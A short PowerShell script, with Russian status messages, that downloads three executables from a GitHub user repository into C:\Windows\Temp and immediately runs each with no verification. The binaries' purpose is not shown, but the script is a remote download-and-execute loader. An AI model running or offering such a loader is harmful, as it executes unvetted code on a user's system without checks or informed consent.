$downloads = @(
    @{ URL = 'https://github.com/fosslas/users/raw/refs/heads/main/Timeless.exe'; Path = 'C:\Windows\Temp\Timeless.exe' },
    @{ URL = 'https://github.com/fosslas/users/raw/refs/heads/main/timeless_scanner.exe'; Path = 'C:\Windows\Temp\timeless_scanner.exe' },
    @{ URL = 'https://github.com/fosslas/users/raw/refs/heads/main/block_majestic.exe'; Path = 'C:\Windows\Temp\block_majestic.exe' }
)

foreach ($item in $downloads) {
    $webClient = New-Object System.Net.WebClient
    $currentPath = $item.Path

    $webClient.add_DownloadProgressChanged({
        Write-Progress -Activity "Загрузка: $currentPath" `
                       -Status "$($_.ProgressPercentage)%" `
                       -PercentComplete $_.ProgressPercentage
    }.GetNewClosure())

    $task = $webClient.DownloadFileTaskAsync($item.URL, $item.Path)
    $task.Wait()

    Write-Progress -Activity "Загрузка: $currentPath" -Status "Готово" -Completed
    Write-Host "Скачано: $currentPath" -ForegroundColor Green
    Start-Process $item.Path
}
